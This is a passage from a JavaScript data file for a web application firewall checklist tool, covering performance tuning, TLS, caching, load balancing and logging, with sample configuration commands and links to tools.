                { id: '8.4.8', text: 'Set up trend analysis for performance data', priority: 'medium' },
                { id: '8.4.9', text: 'Implement bottleneck identification automation', priority: 'high' },
                { id: '8.4.10', text: 'Configure service-level agreement (SLA) monitoring', priority: 'high' },
                { id: '8.4.11', text: 'Set up capacity planning metrics collection', priority: 'medium' },
                { id: '8.4.12', text: 'Implement performance testing integration', priority: 'medium' }
            ]
        },
        {
            title: '8.5 Caching and Acceleration',
            icon: 'fa-rocket',
            items: [
                { id: '8.5.1', text: 'Configure content caching policies', priority: 'high' },
                { id: '8.5.2', text: 'Set up static content acceleration', priority: 'medium' },
                { id: '8.5.3', text: 'Implement dynamic content caching where appropriate', priority: 'medium' },
                { id: '8.5.4', text: 'Configure cache control header management', priority: 'medium' },
                { id: '8.5.5', text: 'Set up RAM-based cache for frequent content', priority: 'high' },
                { id: '8.5.6', text: 'Implement cache invalidation mechanisms', priority: 'medium' },
                { id: '8.5.7', text: 'Configure cache fragmentation reduction', priority: 'medium' },
                { id: '8.5.8', text: 'Set up intelligent partial caching', priority: 'medium' },
                { id: '8.5.9', text: 'Implement cache hit ratio monitoring', priority: 'medium' },
                { id: '8.5.10', text: 'Configure adaptive cache sizing', priority: 'medium' },
                { id: '8.5.11', text: 'Set up cache warmup procedures for common content', priority: 'low' },
                { id: '8.5.12', text: 'Implement cache sharding for distributed environments', priority: 'medium' }
            ]
        },
        {
            title: '8.6 Load Balancing and Scaling',
            icon: 'fa-balance-scale',
            items: [
                { id: '8.6.1', text: 'Configure load balancing algorithms for optimal distribution', priority: 'high' },
                { id: '8.6.2', text: 'Set up auto-scaling policies based on traffic patterns', priority: 'high' },
                { id: '8.6.3', text: 'Implement geographic load distribution', priority: 'medium' },
                { id: '8.6.4', text: 'Configure session persistence appropriately', priority: 'medium' },
                { id: '8.6.5', text: 'Set up load balancer health checks', priority: 'critical' },
                { id: '8.6.6', text: 'Implement graceful service degradation', priority: 'high' },
                { id: '8.6.7', text: 'Configure dynamic server weighting', priority: 'medium' },
                { id: '8.6.8', text: 'Set up advanced health monitoring for backend servers', priority: 'high' },
                { id: '8.6.9', text: 'Implement connection draining for maintenance', priority: 'medium' },
                { id: '8.6.10', text: 'Configure optimized backend connection handling', priority: 'high' },
                { id: '8.6.11', text: 'Set up automated failover mechanisms', priority: 'critical' },
                { id: '8.6.12', text: 'Implement predictive scaling based on traffic patterns', priority: 'medium' }
            ]
        }
    ],
    techniques: [
        {
            title: 'Hardware Resource Optimization',
            content: `
                <p class="mb-4 text-gray-700">Configure optimal hardware resource allocation to ensure maximum WAF performance.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure hardware resources</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">system</span> resources</div>
                    <div class="code-comment"># CPU resource allocation</div>
                    <div><span class="code-param">cpu-allocation traffic-processing</span> <span class="code-value">70</span></div>
                    <div><span class="code-param">cpu-allocation logging</span> <span class="code-value">15</span></div>
                    <div><span class="code-param">cpu-allocation management</span> <span class="code-value">15</span></div>
                    <div><span class="code-param">cpu-cores</span> <span class="code-value">0-7</span> <span class="code-param">function</span> <span class="code-value">traffic-processing</span></div>
                    <div><span class="code-param">cpu-cores</span> <span class="code-value">8-9</span> <span class="code-param">function</span> <span class="code-value">logging</span></div>
                    <div><span class="code-param">cpu-cores</span> <span class="code-value">10-11</span> <span class="code-param">function</span> <span class="code-value">management</span></div>
                    <div class="code-comment"># Memory allocation</div>
                    <div><span class="code-param">memory-allocation traffic-processing</span> <span class="code-value">70</span></div>
                    <div><span class="code-param">memory-allocation cache</span> <span class="code-value">20</span></div>
                    <div><span class="code-param">memory-allocation system</span> <span class="code-value">10</span></div>
                    <div class="code-comment"># Disk I/O optimization</div>
                    <div><span class="code-param">logging-disk-buffer</span> <span class="code-value">4096</span></div>
                    <div><span class="code-param">disk-flush-interval</span> <span class="code-value">10</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Hardware Sizing Guidelines</h5>
                <p class="mb-4 text-gray-700">General guidelines for AppWall hardware sizing based on traffic volume:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Traffic Volume</th>
                            <th class="p-3 border bg-gray-100">CPU Cores</th>
                            <th class="p-3 border bg-gray-100">Memory</th>
                            <th class="p-3 border bg-gray-100">Storage</th>
                            <th class="p-3 border bg-gray-100">Network</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">Light (<100 Mbps)</td>
                            <td class="p-3 border">4-8 cores</td>
                            <td class="p-3 border">16 GB</td>
                            <td class="p-3 border">250 GB SSD</td>
                            <td class="p-3 border">1 Gbps</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Medium (100-500 Mbps)</td>
                            <td class="p-3 border">8-16 cores</td>
                            <td class="p-3 border">32 GB</td>
                            <td class="p-3 border">500 GB SSD</td>
                            <td class="p-3 border">10 Gbps</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Heavy (500 Mbps-1 Gbps)</td>
                            <td class="p-3 border">16-32 cores</td>
                            <td class="p-3 border">64 GB</td>
                            <td class="p-3 border">1 TB SSD</td>
                            <td class="p-3 border">10 Gbps</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Very Heavy (>1 Gbps)</td>
                            <td class="p-3 border">32+ cores</td>
                            <td class="p-3 border">128+ GB</td>
                            <td class="p-3 border">2+ TB SSD</td>
                            <td class="p-3 border">40+ Gbps</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Advanced Hardware Tuning</h5>
                <p class="mb-4 text-gray-700">Additional hardware optimizations for maximum performance:</p>
                
                <div class="code-block">
                    <div class="code-comment"># Advanced hardware tuning</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">system</span> resources</div>
                    <div class="code-comment"># NUMA node optimization</div>
                    <div><span class="code-param">numa-optimization</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">numa-node</span> <span class="code-value">0</span> <span class="code-param">function</span> <span class="code-value">traffic-processing</span></div>
                    <div><span class="code-param">numa-node</span> <span class="code-value">1</span> <span class="code-param">function</span> <span class="code-value">management-logging</span></div>
                    <div class="code-comment"># Network optimization</div>
                    <div><span class="code-command">network</span></div>
                    <div><span class="code-param">rx-buffers</span> <span class="code-value">4096</span></div>
                    <div><span class="code-param">tx-buffers</span> <span class="code-value">4096</span></div>
                    <div><span class="code-param">tcp-backlog</span> <span class="code-value">16384</span></div>
                    <div><span class="code-param">jumbo-frames</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">rx-descriptors</span> <span class="code-value">1024</span></div>
                    <div><span class="code-param">tx-descriptors</span> <span class="code-value">1024</span></div>
                    <div><span class="code-param">interrupt-moderation</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">rss-queues</span> <span class="code-value">max</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># I/O scheduler optimization</div>
                    <div><span class="code-command">storage</span></div>
                    <div><span class="code-param">io-scheduler</span> <span class="code-value">deadline</span></div>
                    <div><span class="code-param">readahead-kb</span> <span class="code-value">1024</span></div>
                    <div><span class="code-param">journal-mode</span> <span class="code-value">write-back</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
            `
        },
        {
            title: 'Security Policy Optimization',
            content: `
                <p class="mb-4 text-gray-700">Optimize security policies to balance protection with performance.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure policy optimization</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">optimization</span></div>
                    <div class="code-comment"># Configure inspection levels</div>
                    <div><span class="code-param">inspection-level</span> <span class="code-value">balanced</span></div>
                    <div><span class="code-param">inspection-order</span> <span class="code-value">most-likely-first</span></div>
                    <div class="code-comment"># URL-specific optimization</div>
                    <div><span class="code-command">url</span> <span class="code-value">add</span> <span class="code-param">path</span> <span class="code-value">"/api/public/status"</span></div>
                    <div><span class="code-command">url</span> <span class="code-value">"/api/public/status"</span></div>
                    <div><span class="code-param">inspection-level</span> <span class="code-value">minimal</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Configure high-security sections</div>
                    <div><span class="code-command">url</span> <span class="code-value">add</span> <span class="code-param">path</span> <span class="code-value">"/admin/*"</span></div>
                    <div><span class="code-command">url</span> <span class="code-value">"/admin/*"</span></div>
                    <div><span class="code-param">inspection-level</span> <span class="code-value">comprehensive</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Optimize signature processing</div>
                    <div><span class="code-command">attack-signatures</span></div>
                    <div><span class="code-param">matching-algorithm</span> <span class="code-value">optimized</span></div>
                    <div><span class="code-param">signature-sets</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Inspection Level Characteristics</h5>
                <p class="mb-4 text-gray-700">Different inspection levels offer trade-offs between security and performance:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Inspection Level</th>
                            <th class="p-3 border bg-gray-100">Security</th>
                            <th class="p-3 border bg-gray-100">Performance</th>
                            <th class="p-3 border bg-gray-100">Recommended For</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">Minimal</td>
                            <td class="p-3 border">Low</td>
                            <td class="p-3 border">High</td>
                            <td class="p-3 border">Public content, static assets, non-sensitive APIs</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Basic</td>
                            <td class="p-3 border">Medium-Low</td>
                            <td class="p-3 border">Medium-High</td>
                            <td class="p-3 border">General web pages with limited user interaction</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Balanced</td>
                            <td class="p-3 border">Medium</td>
                            <td class="p-3 border">Medium</td>
                            <td class="p-3 border">Standard web applications, default profile</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Enhanced</td>
                            <td class="p-3 border">Medium-High</td>
                            <td class="p-3 border">Medium-Low</td>
                            <td class="p-3 border">Applications with sensitive data, authentication</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Comprehensive</td>
                            <td class="p-3 border">High</td>
                            <td class="p-3 border">Low</td>
                            <td class="p-3 border">Admin interfaces, payment processing, critical functions</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Advanced Policy Optimization</h5>
                <p class="mb-4 text-gray-700">Implement advanced performance optimizations for security policies:</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure advanced policy optimization</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">advanced-optimization</span></div>
                    <div class="code-comment"># Regular expression optimization</div>
                    <div><span class="code-param">regex-engine</span> <span class="code-value">hyperscan</span></div>
                    <div><span class="code-param">regex-compilation-level</span> <span class="code-value">aggressive</span></div>
                    <div><span class="code-param">regex-prefiltering</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Content-based triggering</div>
                    <div><span class="code-command">content-triggers</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">sql-injection-checks</span> <span class="code-param">trigger-on</span> <span class="code-value">"sql-keywords"</span></div>
                    <div><span class="code-param">xss-checks</span> <span class="code-param">trigger-on</span> <span class="code-value">"script-tags"</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Rule evaluation optimization</div>
                    <div><span class="code-param">rule-evaluation-mode</span> <span class="code-value">early-termination</span></div>
                    <div><span class="code-param">rule-evaluation-order</span> <span class="code-value">probability-based</span></div>
                    <div><span class="code-param">rule-caching</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">rule-cache-size</span> <span class="code-value">10000</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
            `
        },
        {
            title: 'SSL/TLS Optimization',
            content: `
                <p class="mb-4 text-gray-700">Optimize SSL/TLS processing to ensure secure connections with minimal performance impact.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure SSL/TLS optimization</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">ssl-tls</span></div>
                    <div class="code-comment"># Hardware acceleration</div>
                    <div><span class="code-param">hardware-acceleration</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Session caching</div>
                    <div><span class="code-param">session-cache</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">session-cache-size</span> <span class="code-value">20000</span></div>
                    <div><span class="code-param">session-timeout</span> <span class="code-value">3600</span></div>
                    <div class="code-comment"># Protocol and cipher optimization</div>
                    <div><span class="code-param">protocol-version</span> <span class="code-value">tlsv1.2 tlsv1.3</span></div>
                    <div><span class="code-param">cipher-preference</span> <span class="code-value">server</span></div>
                    <div><span class="code-param">cipher-groups</span> <span class="code-value">modern</span></div>
                    <div class="code-comment"># OCSP stapling for faster validation</div>
                    <div><span class="code-param">ocsp-stapling</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">ocsp-cache-timeout</span> <span class="code-value">3600</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">SSL/TLS Optimization Techniques</h5>
                <p class="mb-4 text-gray-700">Key techniques to optimize SSL/TLS performance while maintaining security:</p>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>TLS 1.3 Preference:</strong> Faster handshakes and improved security</li>
                    <li class="mb-2"><strong>Session Resumption:</strong> Enables clients to reconnect without full handshakes</li>
                    <li class="mb-2"><strong>ECDHE Key Exchange:</strong> More efficient than RSA for key establishment</li>
                    <li class="mb-2"><strong>AES-GCM Ciphers:</strong> Hardware-accelerated on modern processors</li>
                    <li class="mb-2"><strong>OCSP Stapling:</strong> Eliminates separate certificate validation requests</li>
                    <li class="mb-2"><strong>Hardware Acceleration:</strong> Offload cryptographic operations to dedicated hardware</li>
                    <li><strong>Optimized Certificate Chains:</strong> Shorter chains reduce handshake overhead</li>
                </ul>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Advanced TLS Optimization</h5>
                <p class="mb-4 text-gray-700">Implement advanced TLS optimizations for high-traffic environments:</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure advanced TLS optimizations</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">ssl-tls</span></div>
                    <div class="code-comment"># TLS 1.3 optimizations</div>
                    <div><span class="code-param">tls13-early-data</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">tls13-middlebox-compatibility</span> <span class="code-value">disable</span></div>
                    <div><span class="code-param">tls13-ciphersuites</span> <span class="code-value">TLS_AES_128_GCM_SHA256 TLS_AES_256_GCM_SHA384</span></div>
                    <div class="code-comment"># Advanced session management</div>
                    <div><span class="code-param">session-ticket-lifetime</span> <span class="code-value">28800</span></div>
                    <div><span class="code-param">session-ticket-rotation</span> <span class="code-value">86400</span></div>
                    <div><span class="code-param">dynamic-record-sizing</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Certificate optimization</div>
                    <div><span class="code-param">certificate-cache</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">certificate-cache-size</span> <span class="code-value">5000</span></div>
                    <div><span class="code-param">ecdsa-priority</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Hardware optimization</div>
                    <div><span class="code-param">async-engines</span> <span class="code-value">auto</span></div>
                    <div><span class="code-param">cryptodev-instances</span> <span class="code-value">16</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
            `
        },
        {
            title: 'Caching and Content Acceleration',
            content: `
                <p class="mb-4 text-gray-700">Implement caching and content acceleration to improve performance and reduce backend load.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure caching and acceleration</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">caching</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Memory allocation</div>
                    <div><span class="code-param">cache-memory-size</span> <span class="code-value">4096</span></div>
                    <div><span class="code-param">max-object-size</span> <span class="code-value">2048</span></div>
                    <div><span class="code-param">min-object-size</span> <span class="code-value">1</span></div>
                    <div class="code-comment"># Static content caching</div>
                    <div><span class="code-command">static-content</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">file-extensions</span> <span class="code-value">"jpg,jpeg,gif,png,css,js,ico,svg,woff,woff2"</span></div>
                    <div><span class="code-param">default-ttl</span> <span class="code-value">3600</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Dynamic content caching</div>
                    <div><span class="code-command">dynamic-content</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">url-patterns</span> <span class="code-value">add</span> <span class="code-param">pattern</span> <span class="code-value">"/api/products"</span> <span class="code-param">ttl</span> <span class="code-value">300</span></div>
                    <div><span class="code-param">url-patterns</span> <span class="code-value">add</span> <span class="code-param">pattern</span> <span class="code-value">"/api/catalog/*"</span> <span class="code-param">ttl</span> <span class="code-value">600</span></div>
                    <div><span class="code-param">vary-headers</span> <span class="code-value">"Accept-Encoding,Accept-Language"</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Cache control headers</div>
                    <div><span class="code-param">honor-cache-control</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">honor-expires</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">ignore-cache-control-private</span> <span class="code-value">disable</span></div>
                    <div><span class="code-param">ignore-cache-control-no-store</span> <span class="code-value">disable</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Caching Strategy Best Practices</h5>
                <p class="mb-4 text-gray-700">Optimal caching strategies for different content types:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Content Type</th>
                            <th class="p-3 border bg-gray-100">Caching Strategy</th>
                            <th class="p-3 border bg-gray-100">Recommended TTL</th>
                            <th class="p-3 border bg-gray-100">Cache Control Headers</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">Static Images</td>
                            <td class="p-3 border">Aggressive caching</td>
                            <td class="p-3 border">1 week to 1 month</td>
                            <td class="p-3 border">Cache-Control: public, max-age=604800</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">CSS/JavaScript</td>
                            <td class="p-3 border">Version-based caching</td>
                            <td class="p-3 border">1 month+</td>
                            <td class="p-3 border">Cache-Control: public, max-age=2592000</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">API Data (Read-only)</td>
                            <td class="p-3 border">Short-term caching</td>
                            <td class="p-3 border">5-15 minutes</td>
                            <td class="p-3 border">Cache-Control: public, max-age=300</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">API Data (User-specific)</td>
                            <td class="p-3 border">Vary by authentication</td>
                            <td class="p-3 border">1-5 minutes</td>
                            <td class="p-3 border">Cache-Control: private, max-age=60</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">HTML Pages</td>
                            <td class="p-3 border">Conservative caching</td>
                            <td class="p-3 border">0-5 minutes</td>
                            <td class="p-3 border">Cache-Control: no-cache, must-revalidate</td>
                        </tr>
                    </tbody>
                </table>
            `
        },
        {
            title: 'Load Balancing Optimization',
            content: `
                <p class="mb-4 text-gray-700">Configure load balancing for optimal performance, reliability, and scalability.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure load balancing optimization</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">load-balancing</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Load balancing method</div>
                    <div><span class="code-param">method</span> <span class="code-value">least-connections</span></div>
                    <div><span class="code-param">persistence</span> <span class="code-value">source-ip</span></div>
                    <div><span class="code-param">persistence-timeout</span> <span class="code-value">300</span></div>
                    <div class="code-comment"># Server health monitoring</div>
                    <div><span class="code-command">health-check</span></div>
                    <div><span class="code-param">interval</span> <span class="code-value">5</span></div>
                    <div><span class="code-param">timeout</span> <span class="code-value">3</span></div>
                    <div><span class="code-param">up-threshold</span> <span class="code-value">3</span></div>
                    <div><span class="code-param">down-threshold</span> <span class="code-value">3</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Server pool configuration</div>
                    <div><span class="code-command">server-pool</span> <span class="code-value">"web-servers"</span></div>
                    <div><span class="code-param">server</span> <span class="code-value">add</span> <span class="code-param">address</span> <span class="code-value">10.0.1.10</span> <span class="code-param">port</span> <span class="code-value">80</span> <span class="code-param">weight</span> <span class="code-value">100</span></div>
                    <div><span class="code-param">server</span> <span class="code-value">add</span> <span class="code-param">address</span> <span class="code-value">10.0.1.11</span> <span class="code-param">port</span> <span class="code-value">80</span> <span class="code-param">weight</span> <span class="code-value">100</span></div>
                    <div><span class="code-param">server</span> <span class="code-value">add</span> <span class="code-param">address</span> <span class="code-value">10.0.1.12</span> <span class="code-param">port</span> <span class="code-value">80</span> <span class="code-param">weight</span> <span class="code-value">100</span></div>
                    <div><span class="code-param">health-check</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">health-check-url</span> <span class="code-value">"/health"</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Dynamic scaling</div>
                    <div><span class="code-command">auto-scaling</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">scale-up-threshold</span> <span class="code-value">80</span></div>
                    <div><span class="code-param">scale-down-threshold</span> <span class="code-value">20</span></div>
                    <div><span class="code-param">cooldown-period</span> <span class="code-value">300</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Load Balancing Algorithm Comparison</h5>
                <p class="mb-4 text-gray-700">Compare different load balancing algorithms to choose the optimal approach:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Algorithm</th>
                            <th class="p-3 border bg-gray-100">Description</th>
                            <th class="p-3 border bg-gray-100">Best For</th>
                            <th class="p-3 border bg-gray-100">Limitations</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">Round Robin</td>
                            <td class="p-3 border">Distributes requests sequentially to each server</td>
                            <td class="p-3 border">Servers with equal capacity, simple implementation</td>
                            <td class="p-3 border">Doesn't account for server load or response time</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Least Connections</td>
                            <td class="p-3 border">Sends requests to server with fewest active connections</td>
                            <td class="p-3 border">Varying request durations, mixed workloads</td>
                            <td class="p-3 border">May not account for actual server load or capacity</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Weighted Round Robin</td>
                            <td class="p-3 border">Distributes based on assigned server weights</td>
                            <td class="p-3 border">Heterogeneous server environments</td>
                            <td class="p-3 border">Requires manual weight configuration</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Least Response Time</td>
                            <td class="p-3 border">Sends to server with lowest response time</td>
                            <td class="p-3 border">Performance-sensitive applications</td>
                            <td class="p-3 border">Requires active monitoring, more overhead</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">IP Hash</td>
                            <td class="p-3 border">Determines server based on client IP hash</td>
                            <td class="p-3 border">Session persistence without cookies</td>
                            <td class="p-3 border">Can lead to uneven distribution</td>
                        </tr>
                    </tbody>
                </table>
            `
        }
    ],
    tools: [
        {
            title: 'Performance Monitor',
            icon: 'fa-tachometer-alt',
            description: 'Monitor and analyze WAF performance metrics to identify bottlenecks.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'AppWall Monitoring'
        },
        {
            title: 'Load Testing Tool',
            icon: 'fa-weight-hanging',
            description: 'Generate realistic load to verify WAF performance under various conditions.',
            link: 'https://locust.io/',
            linkText: 'Locust'
        },
        {
            title: 'SSL/TLS Analyzer',
            icon: 'fa-lock',
            description: 'Analyze SSL/TLS configuration for performance and security balance.',
            link: 'https://www.ssllabs.com/ssltest/',
            linkText: 'SSL Labs'
        },
        {
            title: 'Network Traffic Analyzer',
            icon: 'fa-project-diagram',
            description: 'Analyze network traffic patterns and identify optimization opportunities.',
            link: 'https://www.wireshark.org/',
            linkText: 'Wireshark'
        },
        {
            title: 'WAF Benchmark Tool',
            icon: 'fa-chart-line',
            description: 'Comprehensive performance benchmarking tool specific to WAF configurations.',
            link: 'https://github.com/TechEmpower/FrameworkBenchmarks',
            linkText: 'TechEmpower'
        },
        {
            title: 'Resource Profiler',
            icon: 'fa-microchip',
            description: 'Detailed system resource utilization profiling for identifying hardware bottlenecks.',
            link: 'https://github.com/brendangregg/perf-tools',
            linkText: 'Perf Tools'
        },
        {
            title: 'Regex Optimization Tool',
            icon: 'fa-search',
            description: 'Analyze and optimize regular expressions used in security rules.',
            link: 'https://regex101.com/',
            linkText: 'Regex101'
        },
        {
            title: 'HTTP/2 Performance Tester',
            icon: 'fa-bolt',
            description: 'Test and optimize HTTP/2 protocol implementations for maximum efficiency.',
            link: 'https://github.com/summerwind/h2spec',
            linkText: 'h2spec'
        },
        {
            title: 'Cache Analysis Tool',
            icon: 'fa-archive',
            description: 'Analyze cache efficiency and optimize cache hit ratios for content acceleration.',
            link: 'https://www.varnish-software.com/community/varnish-cache/',
            linkText: 'Varnish Cache'
        },
        {
            title: 'Latency Analyzer',
            icon: 'fa-stopwatch',
            description: 'Detailed analysis of request latency across all application layers.',
            link: 'https://github.com/Netflix/vector',
            linkText: 'Vector'
        },
        {
            title: 'Flamegraph Generator',
            icon: 'fa-fire',
            description: 'Create CPU/memory usage visualizations to identify performance hotspots.',
            link: 'https://github.com/brendangregg/FlameGraph',
            linkText: 'FlameGraph'
        },
        {
            title: 'Load Balancer Testing Kit',
            icon: 'fa-balance-scale',
            description: 'Test and verify load balancer configurations and failover mechanisms.',
            link: 'https://goreplay.org/',
            linkText: 'GoReplay'
        }
    ]
},
       {
    id: 'reporting',
    title: '9. Reporting & Monitoring',
    subtitle: 'Logging, alerting, and security event management',
    icon: 'fa-chart-line',
    priority: 'high',
    progress: 17,
    checklist: [
        {
            title: '9.1 Logging Configuration',
            icon: 'fa-clipboard-list',
            items: [
                { id: '9.1.1', text: 'Configure centralized logging', priority: 'critical' },
                { id: '9.1.2', text: 'Set up log rotation and retention policies', priority: 'high' },
                { id: '9.1.3', text: 'Configure log format and fields', priority: 'medium' },
                { id: '9.1.4', text: 'Set up secure log transport (TLS/encryption)', priority: 'high' },
                { id: '9.1.5', text: 'Configure log integrity verification', priority: 'medium' },
                { id: '9.1.6', text: 'Implement log storage encryption', priority: 'medium' },
                { id: '9.1.7', text: 'Configure log backup procedures', priority: 'high' },
                { id: '9.1.8', text: 'Set up log forwarding for redundancy', priority: 'medium' },
                { id: '9.1.9', text: 'Implement log parsing and normalization', priority: 'medium' },
                { id: '9.1.10', text: 'Configure log filtering for noise reduction', priority: 'medium' },
                { id: '9.1.11', text: 'Set up log access controls and audit trail', priority: 'high' },
                { id: '9.1.12', text: 'Implement log enrichment with threat intelligence', priority: 'medium' },
                { id: '9.1.13', text: 'Configure log format standardization (CEF, LEEF, JSON)', priority: 'high' },
                { id: '9.1.14', text: 'Set up high-availability logging infrastructure', priority: 'high' }
            ]
        },
        {
            title: '9.2 Alerting & Monitoring',
            icon: 'fa-bell',
            items: [
                { id: '9.2.1', text: 'Set up real-time security alerts', priority: 'critical' },
                { id: '9.2.2', text: 'Configure alert thresholds and severity levels', priority: 'high' },
                { id: '9.2.3', text: 'Implement alert aggregation and correlation', priority: 'medium' },
                { id: '9.2.4', text: 'Set up performance monitoring alerts', priority: 'medium' },
                { id: '9.2.5', text: 'Configure notification methods (email, SMS, API)', priority: 'high' },
                { id: '9.2.6', text: 'Implement escalation procedures for critical alerts', priority: 'high' },
                { id: '9.2.7', text: 'Set up alert throttling to prevent alert fatigue', priority: 'high' },
                { id: '9.2.8', text: 'Configure contextual alert enrichment', priority: 'medium' },
                { id: '9.2.9', text: 'Implement intelligent alert suppression', priority: 'medium' },
                { id: '9.2.10', text: 'Set up alert routing based on attack types', priority: 'medium' },
                { id: '9.2.11', text: 'Configure alert verification mechanisms', priority: 'high' },
                { id: '9.2.12', text: 'Implement on-call rotation for alert management', priority: 'medium' },
                { id: '9.2.13', text: 'Set up SLA-based alerting thresholds', priority: 'high' },
                { id: '9.2.14', text: 'Configure alerts for system health and availability', priority: 'high' }
            ]
        },
        {
            title: '9.3 Security Analytics',
            icon: 'fa-chart-bar',
            items: [
                { id: '9.3.1', text: 'Configure security dashboard and reporting', priority: 'high' },
                { id: '9.3.2', text: 'Set up trend analysis for attack patterns', priority: 'medium' },
                { id: '9.3.3', text: 'Implement attack source tracking and analysis', priority: 'high' },
                { id: '9.3.4', text: 'Configure compliance reporting', priority: 'medium' },
